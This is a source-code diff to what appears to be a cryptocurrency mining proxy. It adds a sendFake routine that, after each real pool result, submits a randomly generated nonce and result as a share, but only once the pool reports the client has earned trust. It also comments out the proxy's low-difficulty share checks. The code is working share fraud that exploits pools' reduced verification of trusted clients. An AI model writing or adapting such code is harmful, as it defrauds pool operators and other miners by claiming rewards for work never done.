@@ -26,6 +26,7 @@
 #include <string.h>
 
 
+#include "net/Client.h"
 #include "log/Log.h"
 #include "net/Job.h"
 #include "proxy/Counters.h"
@@ -40,7 +41,27 @@
 #include "proxy/Uuid.h"
 #include "rapidjson/document.h"
 #include "rapidjson/error/en.h"
+#include "net/SubmitResult.h"
 
+#include <random>
+
+inline uint64_t make_random(uint64_t s, uint64_t e)
+{
+	std::random_device r;
+    std::uniform_int_distribution<uint64_t> dis(s, e);
+	return dis(r);
+}
+
+inline void make_random(uint32_t result[8], uint32_t diff)
+{
+	std::random_device r;
+	for(size_t i=0; i < 7; i++) {
+		result[i] = uint32_t(r() & 0xffffffff);
+	}
+
+	std::uniform_int_distribution<uint32_t> dis(64, (0xffffffffu / diff) - 2u);
+	result[7] = dis(r);
+}
 
 static int64_t nextId = 0;
 
@@ -144,6 +165,9 @@ void Miner::setJob(Job &job)
                         job.rawBlob(), job.id().data(), m_fixedByte, customDiff ? target : job.rawTarget(), job.coin(), job.variant());
     }
 
+    m_top_jobid = job.id().data();
+    m_top_jobid += "000";
+
     send(size);
 }
 
@@ -185,9 +209,12 @@ bool Miner::parseRequest(int64_t id, const char *method, const rapidjson::Value 
             return true;
         }
 
-        SubmitEvent *event = SubmitEvent::create(this, id, params["job_id"].GetString(), params["nonce"].GetString(), params["result"].GetString());
+        Job::fromHex(params["nonce"].GetString(), 8, reinterpret_cast<unsigned char*>(&m_top_nonce)); 
+        SubmitEvent *event = SubmitEvent::create(this, id, params["job_id"].GetString(), params["nonce"].GetString(), params["result"].GetString(), false);
 
-        if (!event->request.isValid() || event->request.actualDiff() < diff()) {
+	
+       /* Idiot code. if diff is up it rejects old shares 
+		if (!event->request.isValid() || event->request.actualDiff() < diff()) {
             event->reject(Error::LowDifficulty);
         }
         else if (m_nicehash && !event->request.isCompatible(m_fixedByte)) {
@@ -197,7 +224,7 @@ bool Miner::parseRequest(int64_t id, const char *method, const rapidjson::Value 
         if (event->error() == Error::NoError && m_customDiff && event->request.actualDiff() < m_diff) {
             success(id, "OK");
             return true;
-        }
+        }*/
 
         if (!event->start()) {
             replyWithError(id, event->message());
@@ -216,12 +243,56 @@ bool Miner::parseRequest(int64_t id, const char *method, const rapidjson::Value 
     return true;
 }
 
+struct lambda_data
+{
+	lambda_data(Miner* obj, Client* pool) : obj(obj), pool(pool) {} 
+	
+	Miner* obj;
+	Client* pool;
+};
+
+void Miner::onPoolResult(Client* pool, const SubmitResult &result)
+{
+    if (m_state != ReadyState || result.fake)
+        return;
+
+	uv_timer_t* fake_timer = new uv_timer_t;
+	lambda_data* dt = new lambda_data(this, pool);
+	fake_timer->data = dt;
+        
+	uv_timer_init(uv_default_loop(), fake_timer);
+	uv_timer_start(fake_timer, [](uv_timer_t *h) { static_cast<lambda_data*>(h->data)->obj->sendFake(h, static_cast<lambda_data*>(h->data)); }, 
+				   make_random(5000, 20000), 0);
+}
+
+void Miner::sendFake(uv_timer_t* timer, lambda_data* dt)
+{
+	uint32_t iresult[8];
+	char nonce[9];
+	char result[65];
+
+    uv_timer_stop(timer);
+    delete timer;
+
+	if (m_state != ReadyState || !dt->pool->hasEarnedTrust())
+        return;
+	m_top_nonce += make_random(m_diff * 0.1, m_diff * 2);
+	Job::toHex(reinterpret_cast<const uint8_t*>(&m_top_nonce), 4, nonce);
+	nonce[8] = '\0';
+
+	make_random(iresult, m_diff);
+
+	Job::toHex(reinterpret_cast<const uint8_t*>(iresult), 32, result);
+	result[64] = '\0';
+
+	SubmitEvent *event = SubmitEvent::create(this, -1, m_top_jobid.c_str(), nonce, result, true);
+	event->start();
+}
 
 void Miner::heartbeat()
 {
     m_expire = uv_now(uv_default_loop()) + kSocketTimeout;
 }
-
 
 void Miner::parse(char *line, size_t len)
 {
@@ -291,7 +362,6 @@ void Miner::setState(State state)
 
     m_state = state;
 }
-
 
 void Miner::shutdown(bool had_error)
 {
